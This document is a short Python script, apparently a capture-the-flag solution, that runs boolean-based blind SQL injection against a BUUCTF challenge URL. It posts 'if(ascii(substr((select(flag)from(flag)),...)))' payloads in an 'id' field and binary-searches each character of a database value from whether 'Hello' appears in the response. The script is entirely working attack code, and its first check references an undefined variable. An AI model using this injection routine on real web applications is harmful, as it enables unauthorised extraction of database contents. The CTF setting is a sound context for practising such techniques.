import requests
import time
result=""
url="http://134644ef-c1ed-4bfd-8721-3ab1f85cd69a.node3.buuoj.cn/"
for x in range(1,50):
    high = 200
    low = 10
    payload = "if(ascii(substr((select(flag)from(flag)),%d,1))>%d,1,0)" % (x, 200)
    data = {
        "id":payload
    }
    response = requests.post(url, data = data)
    if 'Hello' in response.text:
        low = mid+1
        print("字符不是常用字符")
        exit()
    time.sleep(1)
    while high > low:
        mid = (low + high) //2
        payload = "if(ascii(substr((select(flag)from(flag)),%d,1))>%d,1,0)" % (x, mid)
        data = {
            "id":payload
        }
        response = requests.post(url, data = data)
        if 'Hello' in response.text:
            low = mid+1
        else:
            high = mid
    print(low)
    result += chr(low)
print(result)
